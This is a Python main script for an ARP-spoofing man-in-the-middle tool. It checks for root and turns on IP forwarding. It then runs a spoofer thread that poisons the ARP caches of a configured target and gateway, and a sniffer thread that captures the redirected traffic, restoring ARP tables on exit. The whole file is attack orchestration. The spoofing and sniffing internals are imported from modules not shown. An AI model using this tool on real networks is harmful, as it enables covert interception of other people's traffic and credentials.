# -*- coding: utf-8 -*-

import sys
import threading
import os
import config
import utils
import spoofer
import sniffer
import logger

def main():
    # Check if running with sudo
    if os.geteuid() != 0:
        logger.logging.error("Please run this script with sudo!")
        sys.exit(1)

    # Enable IP forwarding
    try:
        utils.enable_ip_forward()
    except Exception as e:
        logger.logging.error(f"Failed to enable IP forwarding: {e}")
        sys.exit(1)

    # Start ARP spoofing thread
    spoof_thread = threading.Thread(
        target=spoofer.start_spoof,
        args=(config.TARGET_IP, config.GATEWAY_IP, config.INTERFACE),
        daemon=True
    )
    spoof_thread.start()

    # Start packet sniffing thread
    sniff_thread = threading.Thread(
        target=sniffer.start_sniffer,
        args=(config.INTERFACE, config.TARGET_IP, config.GATEWAY_IP),
        daemon=True
    )
    sniff_thread.start()

    try:
        # Wait for threads to finish
        spoof_thread.join()
        sniff_thread.join()
    except KeyboardInterrupt:
        logger.logging.info("Stopping ARP spoofing and packet sniffing...")
    finally:
        # Restore ARP tables and disable IP forwarding
        utils.restore_arp(config.TARGET_IP, config.GATEWAY_IP, config.INTERFACE)
        utils.disable_ip_forward()
        logger.logging.info("ARP tables restored, IP forwarding disabled")


if __name__ == "__main__":
    main()
